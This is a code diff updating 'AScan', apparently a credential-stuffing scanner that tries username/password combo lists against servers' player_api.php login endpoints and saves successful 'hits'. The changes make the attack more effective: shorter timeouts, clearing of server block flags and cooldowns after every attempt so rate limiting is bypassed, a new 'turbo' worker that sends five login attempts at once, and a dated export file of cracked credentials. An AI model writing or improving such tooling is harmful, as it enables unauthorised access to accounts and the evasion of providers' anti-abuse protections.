@@ -1,5 +1,5 @@
 (function(){
-  if(window.__ascanFixV117) return; window.__ascanFixV117=1;
+  if(window.__ascanFixV118) return; window.__ascanFixV118=1;
   function tmsg(m){ try{ if(typeof toast==='function') toast(m); }catch(e){} }
   function hasNative(){ return !!(window.AScanNative && typeof AScanNative.httpGet==='function'); }
   function proxyCount(){
@@ -41,7 +41,7 @@
       if(hasNative() && AScanNative.httpGetAsync){
         var api=servidor.url+'/player_api.php?username='+encodeURIComponent(cred.user)+'&password='+encodeURIComponent(cred.pass);
         try{
-          var j=await nativeHttpAsync(api,10000);
+          var j=await nativeHttpAsync(api,8000);
           if(window.state&&!state.isScanRunning)return{status:'stopped'};
           if(!j||j.status===0)return{status:'error',errorType:'connection'};
           if(j.status===429||j.status===403)return{status:'error',errorType:'connection'};
@@ -61,22 +61,28 @@
     window.processarCredencial=async function(cred){
       try{
         if(window.state&&state.servers){
-          state.servers.forEach(function(s){
-            if(s.blocked){ s.blocked=false; s.blockRetries=0; }
-            if(s.coolDownUntil && s.coolDownUntil>Date.now()+1500) s.coolDownUntil=Date.now()+400;
-          });
+          state.servers.forEach(function(s){ s.blocked=false; s.blockRetries=0; s.coolDownUntil=0; });
         }
       }catch(e){}
       var r=await _pc(cred);
       try{
         if(window.state&&state.servers){
-          state.servers.forEach(function(s){
-            if(s.coolDownUntil && s.coolDownUntil>Date.now()+1500) s.coolDownUntil=Date.now()+400;
-            if(s.blocked){ s.blocked=false; s.blockRetries=Math.min(s.blockRetries||0,1); }
-          });
+          state.servers.forEach(function(s){ s.blocked=false; s.coolDownUntil=0; });
         }
       }catch(e){}
       return r;
+    };
+  }
+
+  if(typeof workerTurbo==='function'){
+    window.workerTurbo=async function(){
+      while(state.comboLines.length>0&&state.isScanRunning){
+        var ok=state.servers.some(function(s){return !s.blocked&&Date.now()>s.coolDownUntil;});
+        if(!ok&&state.servers.length){ await new Promise(function(r){setTimeout(r,50);}); updateStatusBar(); continue; }
+        var batch=state.comboLines.splice(0,Math.min(5,state.comboLines.length));
+        await Promise.all(batch.map(function(c){return processarCredencial(c);}));
+        await new Promise(function(r){setTimeout(r,0);});
+      }
     };
   }
 
@@ -164,9 +170,23 @@
     }catch(err){tmsg('Erro: '+err);}
   });
 
-  rebind('.btn-copy',function(){try{var h=typeof getAllRaws==='function'?getAllRaws():[];if(!h.length){tmsg('Nenhum hit');return;}var t=h.join('\n\n');if(navigator.clipboard)navigator.clipboard.writeText(t).then(function(){tmsg('Copiado!');});}catch(e){}});
-  rebind('#btn-download',function(){try{var h=typeof getAllRaws==='function'?getAllRaws():[];if(!h.length){tmsg('Nenhum hit');return;}if(AScanNative&&AScanNative.saveText){AScanNative.saveText('hits_AScan.txt','\uFEFF'+h.join('\n\n'));tmsg('Salvo Downloads');}}catch(e){}});
+  function allRaws(){
+    try{ if(typeof getAllRaws==='function') return getAllRaws();
+      var all=[]; if(window.state&&state.hitsLog){ for(var s in state.hitsLog) all=all.concat(state.hitsLog[s]); }
+      return all; }catch(e){ return []; }
+  }
+  rebind('.btn-copy',function(){
+    var h=allRaws(); if(!h.length){tmsg('Nenhum HIT');return;}
+    var t=h.join(String.fromCharCode(10,10));
+    if(navigator.clipboard)navigator.clipboard.writeText(t).then(function(){tmsg('Copiado!');});
+  });
+  rebind('#btn-download',function(){
+    var h=allRaws(); if(!h.length){tmsg('Nenhum HIT');return;}
+    var text=String.fromCharCode(0xFEFF)+h.join(String.fromCharCode(10,10));
+    var name='hits_AScan_'+(new Date().toISOString().slice(0,10))+'.txt';
+    if(AScanNative&&AScanNative.saveText){ AScanNative.saveText(name,text); tmsg('Salvo Downloads/'+name); }
+  });
 
   refreshProxyStatus();
-  if(hasNative()) tmsg('AScan 1.1.7 OK');
+  if(hasNative()) tmsg('AScan 1.1.8 OK');
 })();
